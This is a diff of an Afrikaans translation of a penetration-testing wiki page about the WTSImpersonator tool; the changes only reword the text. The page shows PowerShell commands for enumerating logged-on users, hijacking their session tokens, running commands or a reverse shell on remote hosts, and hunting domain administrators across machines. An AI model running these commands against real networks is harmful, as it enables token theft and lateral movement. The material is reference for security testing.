@@ -13,7 +13,7 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 </details>
 {% endhint %}
 
-Die **WTS Impersonator** hulpmiddel benut die **"\\pipe\LSM_API_service"** RPC Named pipe om stilweg ingelogde gebruikers te tel en hul tokens te kapen, terwyl dit tradisionele Token Impersonation tegnieke omseil. Hierdie benadering fasiliteer naatlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word toegeskryf aan **Omri Baso, wie se werk beskikbaar is op [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+Die **WTS Impersonator** hulpmiddel benut die **"\\pipe\LSM_API_service"** RPC Named pipe om stilweg ingelogde gebruikers te tel en hul tokens te kap, terwyl tradisionele Token Impersonation tegnieke omseil word. Hierdie benadering fasiliteer naatlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word toegeskryf aan **Omri Baso, wie se werk beskikbaar is op [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
 
 ### Kernfunksionaliteit
 Die hulpmiddel werk deur 'n reeks API-oproepe:
@@ -21,7 +21,7 @@ Die hulpmiddel werk deur 'n reeks API-oproepe:
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
 ### Sleutelmodules en Gebruik
-- **Opname van Gebruikers**: Plaaslike en afstandlike gebruiker opname is moontlik met die hulpmiddel, met opdragte vir enige van die scenario's:
+- **Gebruikers Opname**: Plaaslike en afstandlike gebruikersopname is moontlik met die hulpmiddel, met opdragte vir enige van die scenario's:
 - Plaaslik:
 ```powershell
 .\WTSImpersonator.exe -m enum
@@ -31,7 +31,7 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Uitvoering van Opdragte**: Die `exec` en `exec-remote` modules vereis 'n **Diens** konteks om te funksioneer. Plaaslike uitvoering benodig eenvoudig die WTSImpersonator uitvoerbare lêer en 'n opdrag:
+- **Opdragte Uitvoer**: Die `exec` en `exec-remote` modules vereis 'n **Diens** konteks om te funksioneer. Plaaslike uitvoering benodig eenvoudig die WTSImpersonator uitvoerbare lêer en 'n opdrag:
 - Voorbeeld vir plaaslike opdrag uitvoering:
 ```powershell
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
@@ -47,7 +47,7 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Gebruiker Jag Module**: Teiken spesifieke gebruikers oor verskeie masjiene, wat kode onder hul kredensiale uitvoer. Dit is veral nuttig om Domein Administrators met plaaslike administratiewe regte op verskeie stelsels te teiken.
+- **Gebruiker Jag Module**: Teiken spesifieke gebruikers oor verskeie masjiene, wat kode onder hul kredensiale uitvoer. Dit is veral nuttig om Domein Administrateurs met plaaslike administratiewe regte op verskeie stelsels te teiken.
 - Gebruik voorbeeld:
 ```powershell
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
